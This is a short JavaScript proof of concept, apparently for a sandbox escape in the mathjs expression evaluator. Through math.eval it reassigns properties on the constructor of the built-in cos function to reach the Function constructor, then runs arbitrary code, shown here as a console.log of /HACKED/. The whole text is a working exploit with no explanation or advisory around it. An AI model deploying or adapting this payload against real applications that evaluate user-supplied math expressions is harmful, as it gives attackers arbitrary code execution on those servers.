var math = require("mathjs");
math.eval(`
    {}.constructor.assign(cos.constructor, {binding: cos.bind})
    {}.constructor.assign(cos.constructor, {bind: null})
    cos.constructor.binding()("console.log(/HACKED/)")()
`);
